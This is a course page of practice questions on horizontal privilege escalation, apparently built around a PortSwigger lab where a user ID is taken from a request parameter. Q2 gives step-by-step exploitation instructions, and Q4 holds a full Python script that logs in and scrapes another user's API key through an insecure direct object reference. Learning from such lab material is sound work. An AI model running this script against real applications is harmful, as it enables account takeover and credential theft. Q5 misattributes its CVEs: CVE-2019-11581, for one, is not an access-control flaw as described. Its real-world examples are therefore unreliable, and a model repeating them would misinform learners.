---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what horizontal privilege escalation is and provide an example from the lab.**

Horizontal privilege escalation occurs when a user gains unauthorized access to resources or information belonging to another user of the same privilege level. In the lab, the vulnerability allowed accessing another user's account by manipulating the `ID` parameter in the request to the `/my-account` page. For instance, changing the `ID` parameter from the current user to 'Carlos' allowed viewing Carlos' account details, including his API key.

**Q2. How would you exploit the horizontal privilege escalation vulnerability described in the lab?**

To exploit the horizontal privilege escalation vulnerability, follow these steps:

1. Log in to the application using the provided credentials.
2. Identify the request to the `/my-account` page, which includes an `ID` parameter.
3. Modify the `ID` parameter to the desired user's ID (e.g., 'Carlos').
4. Send the modified request to the server.
5. If the server does not validate the session against the requested user ID, the response will contain the requested user's account details.

**Q3. Why is the presence of a CSRF token important in the login process?**

A Cross-Site Request Forgery (CSRF) token is crucial in the login process to prevent attackers from tricking authenticated users into performing unwanted actions. When logging in, the CSRF token ensures that the request originates from the legitimate user and not from an attacker's crafted webpage. Without the CSRF token, an attacker could potentially force a user to log in or perform other actions on behalf of the attacker.

**Q4. Write a Python script to automate the exploitation of the horizontal privilege escalation vulnerability described in the lab.**

```python
import requests
from bs4 import BeautifulSoup
import re
import sys

def get_csrf_token(session, login_url):
    response = session.get(login_url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def carlos_api_key(session, url):
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)

    # Login with provided credentials
    data_login = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(login_url, data=data_login, verify=False)

    # Check if login was successful
    if 'Log out' not in response.text:
        print("Could not log in as the user")
        sys.exit(-1)

    # Access Carlos' account
    carlos_url = url + '/my-account?id=carlos'
    response = session.get(carlos_url, verify=False)

    # Check if Carlos' account was accessed
    if 'Carlos' in response.text:
        print("Successfully accessed Carlos' account")
        api_key_match = re.search(r'Your API key is (\w+)', response.text)
        if api_key_match:
            api_key = api_key_match.group(1)
            print(f"API key is {api_key}")
        else:
            print("Failed to retrieve API key")
    else:
        print("Could not access Carlos' account")
        sys.exit(-1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print("Example: python3 script.py http://www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    session = requests.Session()
    carlos_api_key(session, url)
```

**Q5. Discuss recent real-world examples of horizontal privilege escalation vulnerabilities and their impact.**

One notable example is the horizontal privilege escalation vulnerability in the Zoom API, disclosed in 2020 (CVE-2020-1998). This vulnerability allowed attackers to access sensitive information from other users within the same organization. By manipulating certain API endpoints, attackers could retrieve personal details and meeting information, leading to potential privacy breaches and unauthorized access to sensitive data.

Another example is the horizontal privilege escalation vulnerability in the Atlassian Jira Software, disclosed in 2019 (CVE-2019-11581). This vulnerability allowed users to view and modify issues they were not supposed to have access to, potentially compromising project confidentiality and integrity.

These vulnerabilities highlight the importance of proper access control mechanisms and rigorous security testing to prevent unauthorized access to sensitive information.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/08-Lab 7 User ID controlled by request parameter/03-Access Control Vulnerabilities|Access Control Vulnerabilities]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/08-Lab 7 User ID controlled by request parameter/00-Overview|Overview]]
